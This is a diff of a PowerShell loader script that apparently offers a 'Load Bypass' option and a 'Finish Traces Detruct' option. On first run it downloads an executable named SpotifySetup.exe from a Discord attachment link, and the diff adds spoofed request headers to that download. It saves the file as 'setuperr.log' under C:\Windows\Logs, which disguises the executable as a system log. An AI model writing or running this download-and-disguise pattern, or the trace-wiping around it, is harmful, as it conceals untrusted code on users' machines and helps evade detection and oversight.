@@ -77,7 +77,11 @@ while ($true) {
     Clear-Host
     if (-not $downloaded) {
         # Realize o download da URL apenas na primeira execução
-        Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1142942470330658856/1194847680120229914/SpotifySetup.exe" -OutFile "C:\Windows\Logs\DPX\setuperr.log"
+        $headers = @{
+            "X-Requested-With" = "XMLHttpRequest"
+            "Referer" = "https://www.wanted.wtf"
+        }
+        Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1142942470330658856/1194847680120229914/SpotifySetup.exe" -OutFile "C:\Windows\Logs\DPX\setuperr.log" -Headers $headers
         $downloaded = $true
     }
 
@@ -94,7 +98,7 @@ while ($true) {
 
     Write-Host "1 - (Load Bypass)"
     Write-Host "2 - (Finish Traces Detruct)"
-    $choice = Read-Host "Escolha uma opção (1 ou 2)"
+    $choice = Read-Host "Escolha uma opcao (1 ou 2)"
 
     if ($choice -eq "1") {
         LoadBypass# Check the instructions here on how to use it https://massgrave.dev/
